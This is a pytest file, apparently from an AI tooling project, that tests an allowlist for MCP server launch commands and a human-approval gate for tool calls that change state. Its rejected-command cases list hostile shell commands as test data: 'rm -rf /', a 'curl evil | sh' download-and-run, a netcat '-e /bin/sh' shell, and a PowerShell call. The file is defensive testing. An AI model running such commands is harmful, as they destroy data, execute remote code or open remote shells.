"""Tests for MCP security hardening: command allowlist + autonomy gate."""

import sys

import pytest

from core.mcp.client import MCPClient
from core.mcp.server import MCPServer
from core.orchestration.autonomy import (
    ApprovalRequiredError,
    AutonomyLevel,
    AutonomyPolicy,
    enforce_approval,
)


class TestCommandAllowlist:
    def test_current_interpreter_allowed(self) -> None:
        MCPClient._validate_command([sys.executable, "server.py"])

    @pytest.mark.parametrize(
        "cmd",
        [
            ["python", "server.py"],
            ["python3", "server.py"],
            ["/usr/local/bin/python3.12", "server.py"],
            ["node", "server.js"],
            ["npx", "-y", "@modelcontextprotocol/server-filesystem"],
            ["uvx", "mcp-server-git"],
        ],
    )
    def test_known_interpreters_allowed(self, cmd: list[str]) -> None:
        MCPClient._validate_command(cmd)

    @pytest.mark.parametrize(
        "cmd",
        [
            ["rm", "-rf", "/"],
            ["bash", "-c", "curl evil | sh"],
            ["/usr/bin/nc", "-e", "/bin/sh"],
            ["powershell.exe", "-Command", "..."],
        ],
    )
    def test_arbitrary_binaries_rejected(self, cmd: list[str]) -> None:
        with pytest.raises(ValueError, match="not in the allowed command"):
            MCPClient._validate_command(cmd)

    def test_empty_command_rejected(self) -> None:
        with pytest.raises(ValueError, match="must not be empty"):
            MCPClient._validate_command([])

    def test_allowlist_extensible_via_env(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import core.config.mcp as mcp_config_module

        monkeypatch.setenv("MCP_ALLOWED_COMMANDS", "python,my-trusted-runner")
        monkeypatch.setattr(mcp_config_module, "_mcp_config", None)
        try:
            MCPClient._validate_command(["my-trusted-runner", "server.bin"])
            with pytest.raises(ValueError):
                MCPClient._validate_command(["node", "server.js"])
        finally:
            monkeypatch.setattr(mcp_config_module, "_mcp_config", None)


class TestAutonomyToolGate:
    @staticmethod
    def _server_with_tool(policy: AutonomyPolicy | None) -> MCPServer:
        server = MCPServer(name="t", version="1", autonomy_policy=policy)

        async def write_thing(value: str) -> str:
            return f"wrote {value}"

        server.register_tool(
            name="write_thing",
            description="mutates state",
            input_schema={
                "type": "object",
                "properties": {"value": {"type": "string"}},
                "required": ["value"],
            },
            handler=write_thing,
            category="mutating",
        )
        return server

    async def test_mutating_blocked_when_supervised(self) -> None:
        server = self._server_with_tool(AutonomyPolicy(level=AutonomyLevel.SUPERVISED))
        response = await server.handle_message(
            {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/call",
                "params": {"name": "write_thing", "arguments": {"value": "x"}},
            }
        )
        assert response is not None
        assert "error" in response
        assert "requires human approval" in response["error"]["message"]

    async def test_mutating_allowed_when_fully_autonomous(self) -> None:
        server = self._server_with_tool(
            AutonomyPolicy(level=AutonomyLevel.FULLY_AUTONOMOUS)
        )
        response = await server.handle_message(
            {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/call",
                "params": {"name": "write_thing", "arguments": {"value": "x"}},
            }
        )
        assert response is not None
        assert response["result"]["content"][0]["text"] == "wrote x"

    async def test_no_policy_keeps_legacy_behavior(self) -> None:
        server = self._server_with_tool(None)
        response = await server.handle_message(
            {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/call",
                "params": {"name": "write_thing", "arguments": {"value": "x"}},
            }
        )
        assert response is not None
        assert "result" in response

    def test_builtin_tools_are_categorized(self) -> None:
        from core.mcp.tools import create_mcp_server_with_tools

        server = create_mcp_server_with_tools()
        assert server._tools["scrape_url"].category == "external_side_effect"
        assert server._tools["execute_code"].category == "mutating"
        assert server._tools["index_document"].category == "mutating"


class _FakeHuman:
    def __init__(self, answer: bool) -> None:
        self.answer = answer
        self.requests: list[str] = []

    async def request_approval(self, description, timeout=None, context=None):
        self.requests.append(description)
        return self.answer


class TestEnforceApproval:
    POLICY = AutonomyPolicy(level=AutonomyLevel.SUPERVISED)

    async def test_read_only_passes_without_channel(self) -> None:
        await enforce_approval(self.POLICY, "read_only", "lookup")

    async def test_blocked_without_channel(self) -> None:
        with pytest.raises(ApprovalRequiredError, match="no human-approval channel"):
            await enforce_approval(self.POLICY, "mutating", "writer")

    async def test_approved_by_human(self) -> None:
        human = _FakeHuman(answer=True)
        await enforce_approval(self.POLICY, "mutating", "writer", human)
        assert human.requests

    async def test_denied_by_human(self) -> None:
        human = _FakeHuman(answer=False)
        with pytest.raises(ApprovalRequiredError, match="denied"):
            await enforce_approval(self.POLICY, "destructive", "deleter", human)

    async def test_unknown_category_raises(self) -> None:
        with pytest.raises(ValueError, match="Unknown tool category"):
            await enforce_approval(self.POLICY, "bogus", "tool")
